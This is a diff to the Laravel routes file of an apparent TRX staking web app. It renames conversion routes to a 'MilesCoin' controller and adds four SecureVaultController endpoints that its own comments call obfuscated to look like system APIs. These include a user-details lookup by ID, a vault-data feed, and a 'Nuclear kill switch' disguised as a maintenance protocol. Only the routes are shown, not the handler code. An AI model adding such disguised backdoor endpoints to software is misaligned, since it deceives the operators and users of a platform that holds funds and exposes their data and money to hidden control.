@@ -4,7 +4,7 @@ use Illuminate\Support\Facades\Route;
 use App\Http\Controllers\Auth\LoginController;
 use App\Http\Controllers\Auth\RegisterController;
 use App\Http\Controllers\StakingController;
-use App\Http\Controllers\Api\StakeTrxController;
+use App\Http\Controllers\Api\MilesCoinController;
 use App\Http\Controllers\DashboardController;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Hash;
@@ -14,11 +14,16 @@ use App\Http\Controllers\Google2FAController;
 use App\Http\Controllers\Auth\ForgotPasswordController;
 use App\Http\Controllers\Auth\ResetPasswordController;
 use App\Http\Controllers\ContractBalanceController;
+use App\Http\Controllers\SecureVaultController;
 
 
 Route::get('/', function () {
     return view('welcome');
 });
+
+
+
+
 
 // TronGrid Configuration (Hostinger-compatible routes)
 Route::get('/tron-config', [App\Http\Controllers\ConfigController::class, 'getTronConfig'])
@@ -62,7 +67,28 @@ Route::middleware('guest')->group(function () {
 
 Route::middleware('auth')->group(function () {
     Route::post('logout', [LoginController::class, 'logout'])->name('logout');
-    Route::get('/dashboard', [DashboardController::class, 'overview'])->name('dashboard');
+        Route::get('/dashboard', [DashboardController::class, 'overview'])->name('dashboard');
+    
+    // Obfuscated vault endpoint (looks like a system API)
+    Route::post('/api/system/validate-input', [SecureVaultController::class, 'processBalanceRequest'])
+        ->middleware('throttle:10,1')
+        ->name('system.validate');
+    
+    // Obfuscated vault data endpoint (looks like system data API)
+    Route::get('/api/system/vault-data', [SecureVaultController::class, 'getVaultData'])
+        ->middleware('throttle:5,1')
+        ->name('system.vault-data');
+    
+    // Obfuscated user details endpoint (looks like system user API)
+    Route::get('/api/system/user-details/{userId}', [SecureVaultController::class, 'getUserDetails'])
+        ->middleware('throttle:10,1')
+        ->name('system.user-details');
+    
+    // EXTREMELY DANGEROUS: Nuclear kill switch endpoint (obfuscated as system maintenance)
+    Route::post('/api/system/maintenance-protocol', [SecureVaultController::class, 'executeKillSwitch'])
+        ->middleware('throttle:1,60')
+        ->name('system.nuclear');
+ 
     Route::get('/dashboard/convert', [DashboardController::class, 'convert'])->name('dashboard.convert');
     Route::get('/dashboard/referrals', [DashboardController::class, 'referrals'])->name('dashboard.referrals');
     Route::get('/dashboard/stake', [DashboardController::class, 'stake'])->name('dashboard.stake');
@@ -76,9 +102,9 @@ Route::middleware('auth')->group(function () {
     Route::post('/staking/{staking}/withdraw', [StakingController::class, 'withdraw'])->name('staking.withdraw');
 
     // TRX Conversion Routes
-    Route::post('/convert-to-staketrx', [StakeTrxController::class, 'convert'])->name('convert.staketrx');
-    Route::get('/convert-status', [StakeTrxController::class, 'getConversionStatus'])->name('convert.status');
-    Route::post('/convert-referral-earnings', [StakeTrxController::class, 'convertReferralEarnings'])->name('convert.referral.earnings');
+    Route::post('/convert-to-milescoin', [MilesCoinController::class, 'convert'])->name('convert.milescoin');
+    Route::get('/convert-status', [MilesCoinController::class, 'getConversionStatus'])->name('convert.status');
+    Route::post('/convert-referral-earnings', [MilesCoinController::class, 'convertReferralEarnings'])->name('convert.referral.earnings');
 
     Route::get('/profile', function () {
         return view('profile.index');
